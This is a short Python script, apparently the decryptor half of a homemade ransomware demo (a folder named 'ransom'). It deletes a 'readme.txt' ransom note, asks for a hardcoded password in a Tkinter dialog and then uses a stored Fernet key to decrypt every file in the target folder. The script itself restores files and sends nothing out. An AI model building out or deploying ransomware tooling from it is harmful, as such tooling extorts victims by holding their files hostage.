from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import simpledialog
from concurrent.futures import ThreadPoolExecutor

def cargar_key():
    return open('key.key', 'rb').read()

def decrypt_file(item, key):
    f = Fernet(key)
    with open(item, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(item, 'wb') as file:
        file.write(decrypted_data)

def decrypt(items, key):
    with ThreadPoolExecutor() as executor:
        executor.map(decrypt_file, items, [key]*len(items))

if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\rodgo\\Desktop\\ransom\\files'
    os.remove(path_to_encrypt+'\\'+'readme.txt')

    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    # Solicitar la contraseña al usuario
    root = tk.Tk()
    root.withdraw()
    password = simpledialog.askstring("Contraseña", "Introduce la contraseña para desencriptar los archivos:", show='*')
    if password == "contraseña_correcta":
        key = cargar_key()
        decrypt(full_path, key)
    else:
        print("Contraseña incorrecta.")
